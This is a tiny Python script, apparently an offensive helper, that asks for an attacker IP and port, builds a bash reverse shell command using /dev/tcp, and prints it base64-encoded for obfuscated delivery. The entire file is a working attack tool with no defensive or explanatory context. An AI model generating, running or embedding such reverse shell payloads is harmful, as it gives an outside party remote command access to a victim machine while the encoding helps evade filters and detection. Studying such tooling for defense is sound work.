import base64

ip = input("Attacker IP: ")
port = input("Port: ")
payload = f"bash -i >& /dev/tcp/{ip}/{port} 0>&1"
encoded = base64.b64encode(payload.encode()).decode()
print("Base64 Payload:\n", encoded)
